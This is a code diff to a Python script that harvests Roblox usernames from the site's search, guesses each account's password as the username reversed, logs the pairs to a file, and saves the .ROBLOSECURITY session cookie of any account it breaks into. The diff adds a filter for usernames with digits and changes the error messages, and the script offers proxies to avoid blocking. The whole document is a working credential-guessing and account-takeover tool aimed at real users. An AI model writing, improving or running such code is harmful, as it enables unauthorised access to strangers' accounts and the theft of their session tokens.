@@ -6,6 +6,12 @@ import threading
 
 f = open('namelist.json')
 data = json.loads(f.read())
+question = str(input("only accounts with numbers in name? yes or no: "))
+
+if question == "yes":
+    numbs  = True
+if question == "no":
+    numbs = False
 question = str(input("proxies yes or no: "))
 
 if question == "yes":
@@ -28,7 +34,10 @@ def getbot():
    resp = requests.get('https://www.roblox.com/search/users/results?maxRows=100&keyword=' + randomname)
    if resp.json()['UserSearchResults']:
        for user in resp.json()['UserSearchResults']:      
-           if user['Name'] and user['Name'].lower().find(randomname):             
+           if user['Name'] and user['Name'].lower().find(randomname):    
+                 if numbs == True and not any(i.isdigit() for i in user['Name']):
+                   print('numnotfound')     
+                   continue    
                  print(user['Name'] + ' password: ' + user['Name'][::-1])
                  with open ('uncheckeduserpass.txt','a') as file:
                      file.write(user['Name'] + ':' + user['Name'][::-1] + '\n')
@@ -60,8 +69,8 @@ def checkacc(name,passs):
         cookie = session.cookies['.ROBLOSECURITY']
         with open ('cookies.txt','w') as file:
             file.write(cookie + '\n')
-    except:
-       print('error logging in noob LOL')
+    except Exception as err:
+       print(err)
     
 
 
